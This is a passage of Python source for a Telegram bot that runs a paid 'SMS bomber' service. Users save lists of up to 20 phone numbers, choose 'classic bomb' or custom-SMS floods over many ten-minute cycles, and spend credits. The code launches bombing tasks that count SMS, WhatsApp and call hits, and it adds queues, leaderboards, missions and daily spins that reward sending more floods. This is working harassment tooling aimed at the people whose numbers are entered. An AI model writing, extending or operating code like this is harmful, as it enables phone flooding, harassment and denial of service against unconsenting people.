        await cq.message.edit_text(user_home_text(uid, d, 2), reply_markup=user_kb_page2(), parse_mode="HTML")
    except: pass
    await cq.answer()


@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass


@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass


# ================= PROFILE =================
@R.callback_query(F.data == "user:profile")
async def user_profile_view(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    u = d["users"].get(str(uid), {})
    nickname = u.get("nickname")
    display = get_display_name(uid, d)
    v = get_validity_info(uid, d)
    achs = get_user_achievements(uid, d)
    ach_count = len(achs)
    ach_total = len(ACHIEVEMENTS)
    badges_line = " ".join(ACHIEVEMENTS[k]["icon"] for k in achs.keys()) if achs else "_No badges yet_"

    text = (f"👤 <b>MY PROFILE</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"🆔 ID: <code>{uid}</code>\n"
            f"📛 Name: <b>{display[:30]}</b>\n"
            f"🏷️ Nickname: <b>{nickname if nickname else 'Not set'}</b>\n"
            f"👑 Role: {role_tag(uid, d)}\n"
            f"💰 Credits: <b>{u.get('credits', 0)}</b>\n"
            f"📤 Total SMS: <b>{u.get('uses', 0)}</b>\n"
            f"👥 Referrals: <b>{u.get('refer_count', 0)}</b>\n"
            f"📅 Joined: <b>{fmt_time(u.get('joined_at', 0))}</b>\n"
            f"🌐 Language: <b>{u.get('language', 'hinglish').upper()}</b>\n\n"
            f"🏅 <b>Badges: {ach_count}/{ach_total}</b>\n"
            f"{badges_line}\n")
    if v["has_validity"]:
        if v["is_expired"]: text += f"\n🎫 Validity: <b>Expired</b>\n"
        else: text += f"\n🎫 Validity: <b>{v['plan_name']}</b> ({v['days_left']}d left)\n"

    rows = [
        [btn("🏅 ᴠɪᴇᴡ ᴀʟʟ ʙᴀᴅɢᴇs", "user:achievements", EMOJI_CHECK, "🏅")],
        [btn("✏️ ᴄʜᴀɴɢᴇ ɴɪᴄᴋɴᴀᴍᴇ", "user:nickname:change", EMOJI_GEAR, "✏️")],
        [btn("🌐 ᴄʜᴀɴɢᴇ ʟᴀɴɢᴜᴀɢᴇ", "user:language", EMOJI_GEAR, "🌐")],
        [btn("ʙᴀᴄᴋ", "user:page:2", EMOJI_GEAR, "🔙")]]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "user:nickname:change")
async def user_nickname_change_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.nickname_input)
    await cq.message.edit_text(
        f"✏️ <b>Set Nickname</b>\n\nNickname bhejo (max 20 chars)\n\n<i>Example: BossKing</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:profile")]), parse_mode="HTML")


@R.message(S.nickname_input)
async def user_nickname_set(msg: Message, state: FSMContext):
    nickname = msg.text.strip()[:20]
    if len(nickname) < 2:
        await msg.answer("❌ Min 2 characters.", parse_mode="HTML")
        return
    d = load()
    uid = msg.from_user.id
    if str(uid) not in d.get("users", {}):
        await state.clear(); return
    d["users"][str(uid)]["nickname"] = nickname
    save(d)
    await state.clear()
    await msg.answer(f"✅ <b>Nickname Set!</b>\n\n🏷️ <b>{nickname}</b>",
        reply_markup=kb([(f"{sc('profile')}", "user:profile"), (f"{sc('home')}", "user:home")]), parse_mode="HTML")


# ================= ACHIEVEMENTS UI =================
@R.callback_query(F.data == "user:achievements")
async def user_achievements_view(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    achs = get_user_achievements(uid, d)
    unlocked_count = len(achs)
    total = len(ACHIEVEMENTS)
    text = (f"🏅 <b>MY ACHIEVEMENTS</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Unlocked: <b>{unlocked_count}/{total}</b>\n\n")
    for key, info in ACHIEVEMENTS.items():
        if key in achs:
            text += f"✅ {info['icon']} <b>{info['name']}</b>\n   <i>{info['condition']}</i>\n\n"
        else:
            text += f"🔒 {info['icon']} <b>{info['name']}</b>\n   <i>{info['condition']}</i>\n\n"
    if len(text) > 4000:
        text = text[:3950] + "\n<i>...truncated</i>"
    try:
        await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "user:profile")]), parse_mode="HTML")
    except: pass


# ================= MISSIONS UI =================
@R.callback_query(F.data == "user:missions")
async def user_missions_view(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    daily = get_or_init_daily_missions(uid, d)
    weekly = get_or_init_weekly_missions(uid, d)
    save(d)
    text = f"🎯 <b>MISSIONS & QUESTS</b>\n━━━━━━━━━━━━━━━━━━\n\n"
    text += f"📅 <b>DAILY MISSIONS</b>\n"
    for key, m in DAILY_MISSIONS.items():
        prog = daily["progress"].get(key, 0)
        target = m["target"]
        status = "✅" if prog >= target else "⬜"
        claimed = " [CLAIMED]" if key in daily.get("claimed", []) else ""
        text += f"{status} {m['icon']} {m['name']} ({prog}/{target}) → +{m['reward']}{claimed}\n"
    text += f"\n📆 <b>WEEKLY MISSIONS</b>\n"
    for key, m in WEEKLY_MISSIONS.items():
        prog = weekly["progress"].get(key, 0)
        target = m["target"]
        status = "✅" if prog >= target else "⬜"
        claimed = " [CLAIMED]" if key in weekly.get("claimed", []) else ""
        text += f"{status} {m['icon']} {m['name']} ({prog}/{target}) → +{m['reward']}{claimed}\n"
    rows = [
        [btn("🎁 ᴄʟᴀɪᴍ ᴀʟʟ ʀᴇᴡᴀʀᴅs", "user:missions:claim", EMOJI_GIFT, "🎁")],
        [btn("ʙᴀᴄᴋ", "user:page:2", EMOJI_GEAR, "🔙")]
    ]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "user:missions:claim")
async def user_missions_claim(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    daily = get_or_init_daily_missions(uid, d)
    weekly = get_or_init_weekly_missions(uid, d)
    total_credits = 0
    claimed_count = 0
    for key, m in DAILY_MISSIONS.items():
        prog = daily["progress"].get(key, 0)
        if prog >= m["target"] and key not in daily.get("claimed", []):
            daily.setdefault("claimed", []).append(key)
            add_credits(uid, m["reward"], d)
            total_credits += m["reward"]
            claimed_count += 1
    for key, m in WEEKLY_MISSIONS.items():
        prog = weekly["progress"].get(key, 0)
        if prog >= m["target"] and key not in weekly.get("claimed", []):
            weekly.setdefault("claimed", []).append(key)
            add_credits(uid, m["reward"], d)
            total_credits += m["reward"]
            claimed_count += 1
    save(d)
    if claimed_count == 0:
        await cq.answer("❌ Koi mission complete nahi!", show_alert=True)
        return
    await cq.answer(f"✅ {claimed_count} missions claimed! +{total_credits} credits", show_alert=True)
    try:
        await cq.message.edit_text(
            f"🎉 <b>MISSIONS CLAIMED!</b>\n\n"
            f"✅ Total claimed: <b>{claimed_count}</b>\n"
            f"💰 Credits earned: <b>+{total_credits}</b>\n\n"
            f"💳 New Balance: <b>{get_user_credits(uid, d)}</b>",
            reply_markup=kb([(f"{sc('missions')}", "user:missions"), (f"{sc('home')}", "user:home")]),
            parse_mode="HTML")
    except: pass


# ================= TOURNAMENT UI =================
@R.callback_query(F.data.in_({"user:tournament", "owner:tournament", "admin:tournament"}))
async def tournament_view(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    t = get_current_tournament(d)
    week = t.get("week", ist_week_str())
    scores = t.get("scores", {})
    my_score = scores.get(str(uid), 0)
    arr = []
    for u_str, sc_val in scores.items():
        try:
            arr.append((int(u_str), get_display_name(int(u_str), d), sc_val))
        except: pass
    arr.sort(key=lambda x: x[2], reverse=True)
    my_rank = "-"
    for i, (u_id, _, _) in enumerate(arr, 1):
        if u_id == uid:
            my_rank = f"#{i}"
            break
    prizes = d.get("tournaments", {}).get("prizes", [500, 250, 100])
    text = (f"🏆 <b>WEEKLY TOURNAMENT</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📅 Week: <b>{week}</b>\n\n"
            f"🥇 1st: <b>{prizes[0]} credits</b>\n"
            f"🥈 2nd: <b>{prizes[1]} credits</b>\n"
            f"🥉 3rd: <b>{prizes[2]} credits</b>\n\n"
            f"📊 <b>YOUR RANK: {my_rank}</b>\n"
            f"📤 SMS This Week: <b>{my_score}</b>\n\n")
    if arr:
        text += f"🏆 <b>TOP 10:</b>\n"
        medals = ["🥇", "🥈", "🥉"]
        for i, (u_id, name, sc_val) in enumerate(arr[:10], 1):
            medal = medals[i-1] if i <= 3 else f"{i}."
            hl = " ◀ ʏᴏᴜ" if u_id == uid else ""
            text += f"{medal} {name[:15]} — {sc_val}{hl}\n"
    else:
        text += "<i>Koi scores nahi abhi tak!</i>"
    if is_owner(uid, d): back = "owner:home"
    elif is_admin(uid, d): back = "admin:home"
    else: back = "user:page:2"
    rows = []
    if is_owner(uid, d):
        rows.append([btn("⚙️ ᴛᴏᴜʀɴᴀᴍᴇɴᴛ sᴇᴛᴛɪɴɢs", "owner:tournament:settings", EMOJI_GEAR, "⚙️")])
    rows.append([btn("ʀᴇғʀᴇsʜ", cq.data, EMOJI_GEAR, "🔄")])
    rows.append([btn("ʙᴀᴄᴋ", back, EMOJI_GEAR, "🔙")])
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass
    await cq.answer()


# ================= SPIN WHEEL =================
@R.callback_query(F.data == "user:spin")
async def user_spin_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    u = d.get("users", {}).get(str(uid), {})
    last_spin = u.get("last_spin", 0)
    now = int(time.time())
    time_since = now - last_spin
    can_spin = time_since >= 86400
    text = (f"🎡 <b>DAILY SPIN WHEEL</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"Roz ek spin karo aur credits jeeto!\n\n"
            f"<b>Prizes:</b>\n1-5 credits (common)\n10 credits (rare!)\n\n")
    if can_spin:
        text += f"✅ <b>Ready to spin!</b>"
    else:
        rem = 86400 - time_since
        hrs = rem // 3600
        mins = (rem % 3600) // 60
        text += f"⏰ Next spin: <b>{hrs}h {mins}m</b>"
    rows = []
    if can_spin:
        rows.append([btn("🎡 sᴘɪɴ ɴᴏᴡ", "user:spin:do", EMOJI_GIFT, "🎡")])
    rows.append([btn("ʙᴀᴄᴋ", "user:page:2", EMOJI_GEAR, "🔙")])
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "user:spin:do")
async def user_spin_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    u = d.get("users", {}).get(str(uid), {})
    last_spin = u.get("last_spin", 0)
    now = int(time.time())
    if now - last_spin < 86400:
        await cq.answer("⏰ Already spun today!", show_alert=True)
        return
    prize = spin_wheel()
    add_credits(uid, prize, d)
    d["users"][str(uid)]["last_spin"] = now
    d.setdefault("user_stats", {}).setdefault(str(uid), {})
    d["user_stats"][str(uid)]["spin_count"] = d["user_stats"][str(uid)].get("spin_count", 0) + 1
    add_mission_progress(uid, "spin_1", 1, d)
    save(d)
    new_badges = check_and_unlock_achievements(cq.bot, uid, d)
    save(d)
    await cq.answer(f"🎉 You won {prize} credits!", show_alert=True)
    try:
        await cq.message.edit_text(
            f"🎡 <b>SPIN RESULT!</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"🎉 <b>+{prize} credits!</b>\n\n"
            f"💳 New Balance: <b>{get_user_credits(uid, d)}</b>\n\n"
            f"<i>Kal phir aana!</i>",
            reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
    except: pass
    for badge_key in new_badges:
        b = ACHIEVEMENTS[badge_key]
        try:
            await cq.bot.send_message(uid,
                f"🏅 <b>NEW ACHIEVEMENT!</b>\n\n{b['icon']} <b>{b['name']}</b>\n📋 {b['condition']}",
                parse_mode="HTML")
        except: pass


# ================= LANGUAGE =================
@R.callback_query(F.data == "user:language")
async def user_language_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    current = d.get("users", {}).get(str(uid), {}).get("language", "hinglish")
    text = f"🌐 <b>Change Language</b>\n\nCurrent: <b>{current.upper()}</b>"
    rows = [
        [btn("🇬🇧 ᴇɴɢʟɪsʜ", "user:lang:set:en", EMOJI_CHECK if current == "en" else None, "✅" if current == "en" else "🇬🇧")],
        [btn("🇮🇳 ʜɪɴᴅɪ", "user:lang:set:hi", EMOJI_CHECK if current == "hi" else None, "✅" if current == "hi" else "🇮🇳")],
        [btn("🇮🇳 ʜɪɴɢʟɪsʜ", "user:lang:set:hinglish", EMOJI_CHECK if current == "hinglish" else None, "✅" if current == "hinglish" else "🇮🇳")],
        [btn("ʙᴀᴄᴋ", "user:page:2", EMOJI_GEAR, "🔙")]]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data.startswith("user:lang:set:"))
async def user_language_set(cq: CallbackQuery, state: FSMContext):
    lang = cq.data.split(":")[-1]
    if lang not in LANG_STRINGS:
        await cq.answer("❌ Invalid!", show_alert=True)
        return
    d = load()
    uid = cq.from_user.id
    if str(uid) not in d.get("users", {}):
        await cq.answer("❌ Not found!", show_alert=True)
        return
    d["users"][str(uid)]["language"] = lang
    save(d)
    await cq.answer(f"✅ {lang.upper()}!", show_alert=True)
    await user_language_menu(cq, state)


# ================= SAVED LISTS =================
@R.callback_query(F.data == "user:lists:menu")
async def user_lists_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    lists = get_user_lists(uid, d)
    text = f"📋 <b>MY SAVED LISTS</b>\n━━━━━━━━━━━━━━━━━━\nTotal: <b>{len(lists)}</b>\n\n"
    if lists:
        for i, lst in enumerate(lists, 1):
            text += f"{i}. <b>{lst['name'][:25]}</b> — {len(lst.get('numbers', []))} numbers\n"
    else:
        text += "<i>Koi list save nahi.</i>\n\n💡 Common targets save karo!"
    rows = []
    if lists:
        for idx, lst in enumerate(lists):
            rows.append([btn(f"🎯 {lst['name'][:15]}", f"user:list:quick:{idx}", EMOJI_ROCKET, "🎯"),
                         btn("🗑", f"user:list:del:{idx}", EMOJI_CROSS, "🗑")])
    rows.append([btn("➕ ᴀᴅᴅ ɴᴇᴡ ʟɪsᴛ", "user:list:add", EMOJI_CHECK, "➕")])
    rows.append([btn("ʙᴀᴄᴋ", "user:page:1", EMOJI_GEAR, "🔙")])
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "user:list:add")
async def user_list_add_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.save_list_name)
    await cq.message.edit_text(
        f"📋 <b>Add New List</b>\n\n<b>Step 1/2:</b> List name\n<i>Example: College Friends</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:lists:menu")]), parse_mode="HTML")


@R.message(S.save_list_name)
async def user_list_add_name(msg: Message, state: FSMContext):
    name = msg.text.strip()[:25]
    if len(name) < 2:
        await msg.answer("❌ Min 2 chars.", parse_mode="HTML")
        return
    await state.update_data(list_name=name)
    await state.set_state(S.save_list_numbers)
    await msg.answer(f"✅ <b>{name}</b>\n\n<b>Step 2/2:</b> Numbers bhejo (comma/space separated)\n\n"
        f"<i>Example: 9876543210, 9123456789</i>\n\n<i>Max 20</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:lists:menu")]), parse_mode="HTML")


@R.message(S.save_list_numbers)
async def user_list_add_numbers(msg: Message, state: FSMContext):
    numbers = parse_numbers(msg.text)
    if not numbers:
        await msg.answer("❌ Valid number nahi mila.", parse_mode="HTML")
        return
    if len(numbers) > 20:
        await msg.answer(f"❌ Max 20. Aapne {len(numbers)}.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    name = fsmd.get("list_name", "List")
    uid = msg.from_user.id
    d = load()
    ok = save_user_list(uid, name, numbers, d)
    if not ok:
        await state.clear()
        await msg.answer(f"❌ Is naam ki list pehle se hai!",
            reply_markup=kb([(f"{sc('back')}", "user:lists:menu")]), parse_mode="HTML")
        return
    save(d)
    await state.clear()
    await msg.answer(f"✅ <b>List Saved!</b>\n\n📋 <b>{name}</b>\n🔢 {len(numbers)} numbers",
        reply_markup=kb([(f"{sc('my lists')}", "user:lists:menu"), (f"{sc('home')}", "user:home")]), parse_mode="HTML")


@R.callback_query(F.data.startswith("user:list:del:"))
async def user_list_del(cq: CallbackQuery, state: FSMContext):
    idx = int(cq.data.split(":")[-1])
    d = load()
    uid = cq.from_user.id
    lists = get_user_lists(uid, d)
    if 0 <= idx < len(lists):
        name = lists[idx]["name"]
        delete_user_list(uid, name, d)
        save(d)
        await cq.answer(f"🗑 '{name}' deleted!", show_alert=True)
    await user_lists_menu(cq, state)


@R.callback_query(F.data.startswith("user:list:quick:"))
async def user_list_quick_bomb_start(cq: CallbackQuery, state: FSMContext):
    idx = int(cq.data.split(":")[-1])
    d = load()
    uid = cq.from_user.id
    lists = get_user_lists(uid, d)
    if not (0 <= idx < len(lists)):
        await cq.answer("❌ List not found!", show_alert=True)
        return
    lst = lists[idx]
    numbers = lst.get("numbers", [])
    if not numbers:
        await cq.answer("❌ Empty list!", show_alert=True)
        return
    await state.update_data(quick_list_idx=idx, quick_list_name=lst["name"])
    await state.set_state(S.quick_bomb_type)
    deduct = should_deduct_credits(uid, d)
    if deduct:
        credits = get_user_credits(uid, d)
        per_cycle_cost = len(numbers) * CREDITS_PER_CYCLE
        info = (f"💰 Credits: <b>{credits}</b>\n"
                f"💵 Per cycle cost: <b>{per_cycle_cost}</b>\n"
                f"   ({len(numbers)} × {CREDITS_PER_CYCLE})")
    else:
        if has_active_validity(uid, d):
            v = get_validity_info(uid, d)
            info = (f"🎫 <b>VALIDITY: {v['plan_name']}</b>\n"
                    f"📅 Days left: <b>{v['days_left']}</b>\n"
                    f"✅ <b>No credit deduction!</b>")
        else:
            info = "💰 Admin/Owner: No deduction"
    try:
        await cq.message.edit_text(
            f"🎯 <b>QUICK BOMB: {lst['name']}</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"🔢 Numbers: <b>{len(numbers)}</b>\n{info}\n\n"
            f"<b>Kaunsa bomb chalana hai?</b>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [btn("💥 ᴄʟᴀssɪᴄ ʙᴏᴍʙ", "quickbomb:type:classic", EMOJI_FIRE, "💥")],
                [btn("📤 ᴄᴜsᴛᴏᴍ sᴍs", "quickbomb:type:custom", EMOJI_ROCKET, "📤")],
                [btn("ᴄᴀɴᴄᴇʟ", "user:lists:menu", EMOJI_CROSS, "❌")]
            ]),
            parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "quickbomb:type:classic")
async def quickbomb_classic(cq: CallbackQuery, state: FSMContext):
    await state.update_data(quick_bomb_type="classic")
    await state.set_state(S.quick_bomb_cycles)
    await cq.message.edit_text(
        f"💥 <b>CLASSIC BOMB</b>\n\n<b>Kitne cycles?</b>\n<i>1 cycle = 10 min per number</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:lists:menu")]), parse_mode="HTML")


@R.callback_query(F.data == "quickbomb:type:custom")
async def quickbomb_custom(cq: CallbackQuery, state: FSMContext):
    await state.update_data(quick_bomb_type="custom_sms")
    await state.set_state(S.user_schedule_custom_message)
    await cq.message.edit_text(
        f"📤 <b>CUSTOM SMS</b>\n\n<b>Message bhejo:</b>\nJo SMS bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:lists:menu")]), parse_mode="HTML")


@R.message(S.quick_bomb_cycles)
async def quickbomb_classic_execute(msg: Message, state: FSMContext):
    try:
        cycles = int(msg.text.strip())
        if cycles < 1: raise ValueError
    except:
        await msg.reply("❌ Valid number bhejo.", parse_mode="Markdown")
        return
    fsmd = await state.get_data()
    idx = fsmd.get("quick_list_idx")
    name = fsmd.get("quick_list_name")
    uid = msg.from_user.id
    d = load()
    lists = get_user_lists(uid, d)
    if not (0 <= idx < len(lists)):
        await state.clear()
        await msg.reply("❌ List lost.", parse_mode="Markdown")
        return
    numbers = lists[idx]["numbers"]
    deduct = should_deduct_credits(uid, d)
    if deduct:
        total_needed = len(numbers) * cycles * CREDITS_PER_CYCLE
        have = get_user_credits(uid, d)
        if have < total_needed:
            await state.clear()
            await msg.reply(f"❌ *Insufficient credits!*\nRequired: `{total_needed}`\nYou have: `{have}`",
                parse_mode="Markdown")
            return
        deduct_credits(uid, total_needed, d)
        save(d)
        credit_msg = f"💰 Deducted: `{total_needed}` | Left: `{get_user_credits(uid, d)}`"
    else:
        if has_active_validity(uid, d):
            credit_msg = f"🎫 Valid: `{get_validity_info(uid, d)['plan_name']}` — No deduction ✅"
        else:
            credit_msg = "💰 Admin/Owner: No deduction"
    await state.clear()
    active_classic_bombings[uid] = True
    classic_bombing_stats[uid] = {'sms': 0, 'wa': 0, 'calls': 0}
    await msg.reply(f"🎯 *QUICK BOMB STARTED!*\n📋 List: `{name}`\n🔢 Numbers: `{len(numbers)}`\n"
        f"🔁 Cycles each: `{cycles}`\n⏱️ Total: `{len(numbers) * cycles * BOMB_DURATION_MINUTES}` min\n{credit_msg}",
        parse_mode="Markdown")
    pass_credits = CREDITS_PER_CYCLE if deduct else 0
    asyncio.create_task(multi_number_bombing(msg.bot, msg.chat.id, uid, numbers, cycles, pass_credits))


# ================= BOMB QUEUE =================
@R.callback_query(F.data == "user:queue:view")
async def user_queue_view(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    queue = get_queue(uid)
    text = f"⏳ <b>MY BOMB QUEUE</b>\n━━━━━━━━━━━━━━━━━━\nQueued: <b>{len(queue)}</b>\n\n"
    if queue:
        for i, item in enumerate(queue, 1):
            text += f"{i}. 📱 <code>{mask_number(item['phone'])}</code> — {item['cycles']} cycles\n"
        text += f"\n💡 Current bomb ke baad auto-start honge."
    else:
        text += "<i>Koi bomb queue me nahi.</i>"
    rows = []
    if queue:
        for i, item in enumerate(queue):
            rows.append([
                btn(f"⬆️ {i+1}", f"user:queue:up:{i}", EMOJI_GEAR, "⬆️"),
                btn(f"⬇️ {i+1}", f"user:queue:down:{i}", EMOJI_GEAR, "⬇️"),
                btn(f"🗑 {i+1}", f"user:queue:item_del:{i}", EMOJI_CROSS, "🗑")
            ])
        rows.append([btn("🗑 ᴄʟᴇᴀʀ ᴀʟʟ", "user:queue:clear", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "user:page:1", EMOJI_GEAR, "🔙")])
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "user:queue:clear")
async def user_queue_clear(cq: CallbackQuery, state: FSMContext):
    clear_queue(cq.from_user.id)
    await cq.answer("🗑 Cleared!", show_alert=True)
    await user_queue_view(cq, state)


@R.callback_query(F.data.startswith("user:queue:up:"))
async def user_queue_up(cq: CallbackQuery, state: FSMContext):
    idx = int(cq.data.split(":")[-1])
    uid = cq.from_user.id
    if move_queue_item(uid, idx, -1):
        await cq.answer("⬆️ Moved up!", show_alert=False)
    else:
        await cq.answer("❌ Can't move!", show_alert=False)
    await user_queue_view(cq, state)


@R.callback_query(F.data.startswith("user:queue:down:"))
async def user_queue_down(cq: CallbackQuery, state: FSMContext):
    idx = int(cq.data.split(":")[-1])
    uid = cq.from_user.id
    if move_queue_item(uid, idx, 1):
        await cq.answer("⬇️ Moved down!", show_alert=False)
    else:
        await cq.answer("❌ Can't move!", show_alert=False)
    await user_queue_view(cq, state)


@R.callback_query(F.data.startswith("user:queue:item_del:"))
async def user_queue_item_del(cq: CallbackQuery, state: FSMContext):
    idx = int(cq.data.split(":")[-1])
    uid = cq.from_user.id
    q = BOMB_QUEUE.get(uid, [])
    if 0 <= idx < len(q):
        q.pop(idx)
        BOMB_QUEUE[uid] = q
        await cq.answer("🗑 Removed!", show_alert=False)
    await user_queue_view(cq, state)


# ================= TEMPLATES =================
@R.callback_query(F.data == "user:templates:menu")
async def user_templates_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    templates = get_user_templates(uid, d)
    max_limit = d.get("template_limit", 10)
    text = (f"📝 <b>MY MESSAGE TEMPLATES</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Total: <b>{len(templates)}/{max_limit}</b>\n\n")
    if templates:
        for i, t in enumerate(templates, 1):
            preview = t['text'][:40] + ('...' if len(t['text']) > 40 else '')
            text += f"{i}. <b>{t['name'][:20]}</b>\n   <i>{preview}</i>\n   Uses: {t.get('uses', 0)}\n\n"
    else:
        text += "<i>Koi template save nahi hai.</i>\n\n"
        text += "💡 Common messages save karo — SMS/Classic me 1-tap use kar sakte ho!"
    try:
        await cq.message.edit_text(text, reply_markup=templates_kb(uid, d), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "user:template:add")
async def user_template_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    templates = get_user_templates(uid, d)
    max_limit = d.get("template_limit", 10)
    if len(templates) >= max_limit:
        await cq.answer(f"❌ Max {max_limit} templates!", show_alert=True)
        return
    await state.set_state(S.template_save_name)
    await cq.message.edit_text(
        f"📝 <b>Add Template</b>\n\n<b>Step 1/2:</b> Template name\n"
        f"<i>Example: Promotion, Offer, Welcome</i>\n\n<i>Max 25 chars</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:templates:menu")]), parse_mode="HTML")


@R.message(S.template_save_name)
async def user_template_add_name(msg: Message, state: FSMContext):
    name = msg.text.strip()[:25]
    if len(name) < 2:
        await msg.answer("❌ Min 2 characters.", parse_mode="HTML")
        return
    await state.update_data(template_name=name)
    await state.set_state(S.template_save_text)
    await msg.answer(f"✅ Name: <b>{name}</b>\n\n<b>Step 2/2:</b> Message text bhejo",
        reply_markup=kb([(f"{sc('cancel')}", "user:templates:menu")]), parse_mode="HTML")


@R.message(S.template_save_text)
async def user_template_add_text(msg: Message, state: FSMContext):
    text = msg.text.strip()[:500]
    if not text:
        await msg.answer("❌ Message empty.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    name = fsmd.get("template_name", "Template")
    uid = msg.from_user.id
    d = load()
    success, err_msg = save_user_template(uid, name, text, d)
    if not success:
        await state.clear()
        await msg.answer(f"❌ {err_msg}", reply_markup=kb([(f"{sc('back')}", "user:templates:menu")]), parse_mode="HTML")
        return
    save(d)
    await state.clear()
    await msg.answer(f"✅ <b>Template Saved!</b>\n\n📝 {name}\n💬 {text[:100]}",
        reply_markup=kb([(f"{sc('my templates')}", "user:templates:menu"), (f"{sc('home')}", "user:home")]), parse_mode="HTML")


@R.callback_query(F.data.startswith("user:template:del:"))
async def user_template_del(cq: CallbackQuery, state: FSMContext):
    idx = int(cq.data.split(":")[-1])
    d = load()
    uid = cq.from_user.id
    templates = get_user_templates(uid, d)
    if 0 <= idx < len(templates):
        name = templates[idx]["name"]
        delete_user_template(uid, name, d)
        save(d)
        await cq.answer(f"🗑 '{name}' deleted!", show_alert=True)
    await user_templates_menu(cq, state)


@R.callback_query(F.data.startswith("user:template:edit:"))
async def user_template_edit_start(cq: CallbackQuery, state: FSMContext):
    idx = int(cq.data.split(":")[-1])
    d = load()
    uid = cq.from_user.id
    templates = get_user_templates(uid, d)
    if not (0 <= idx < len(templates)):
        await cq.answer("❌ Template not found!", show_alert=True)
        return
    t = templates[idx]
    await state.update_data(template_edit_name=t["name"])
    await state.set_state(S.template_edit_text)
    await cq.message.edit_text(
        f"✏️ <b>Edit Template: {t['name']}</b>\n\n"
        f"<b>Current:</b> <i>{t['text'][:200]}</i>\n\n"
        f"Naya message text bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:templates:menu")]), parse_mode="HTML")


@R.message(S.template_edit_text)
async def user_template_edit_done(msg: Message, state: FSMContext):
    text = msg.text.strip()[:500]
    if not text:
        await msg.answer("❌ Message empty.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    name = fsmd.get("template_edit_name")
    uid = msg.from_user.id
    d = load()
    k = str(uid)
    if k in d.get("users", {}):
        for t in d["users"][k].get("templates", []):
            if t.get("name") == name:
                t["text"] = text
                break
        save(d)
    await state.clear()
    await msg.answer(f"✅ Template updated!",
        reply_markup=kb([(f"{sc('my templates')}", "user:templates:menu")]), parse_mode="HTML")


@R.callback_query(F.data.startswith("user:template:use:"))
async def user_template_use_hint(cq: CallbackQuery, state: FSMContext):
    await cq.answer("💡 Ye SMS/Classic bomb me dropdown se use hoga!", show_alert=True)


# ================= NOTIFICATION PREFERENCES =================
@R.callback_query(F.data == "user:notif_prefs")
async def user_notif_prefs_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    prefs = d.get("users", {}).get(str(uid), {}).get("notif_prefs", {})
    text = (f"🔔 <b>NOTIFICATION PREFERENCES</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"Konsa notification chahiye?\n\n"
